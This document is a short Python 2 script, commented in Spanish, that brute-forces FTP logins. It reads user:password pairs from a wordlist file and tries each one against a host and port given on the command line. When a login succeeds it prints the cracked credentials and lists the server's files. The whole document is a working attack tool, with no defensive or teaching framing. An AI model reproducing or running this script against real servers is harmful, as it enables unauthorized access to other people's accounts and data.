import ftplib
import sys
from time import sleep


def readDict(filename):
	print "Starting BruteForce Against = %s:%s"%(host,port)
	sleep(2)
	file = open(filename, 'r')
	for line in file:		
		user = line.split(':')[0]  # user:passwords ----> user[0], passwords[1]
		passw = line.split(':')[1].strip('\r').strip('\n')
		attack(user,passw)

def attack(username,password):
	global host
	global port
	global founded
	founded = 0
	ftp = ftplib.FTP()  # Objeto declarado (ftp)	
	try:		
		print "[*]Trying = [%s:%s]"%(username,password)
		ftp.connect(host,port)
		ftp.login(username,password)
		print "\n[+]connected", ftp.getwelcome()
		print "[+]User:password Found ===> %s:%s \n"%(username,password)
		print ftp.nlst()
		ftp.quit()
		ftp.close()
		founded = 1
		exit(0)
	except Exception, e:
		pass

					
def main():
	global host
	global port
	global founded
	host = sys.argv[1]
	port = sys.argv[2]
	readDict('diccionario.txt')
	if founded == 1:
		pass
	else:
		print "[-] No credentials Found "	

if __name__ == '__main__':
	main()
		
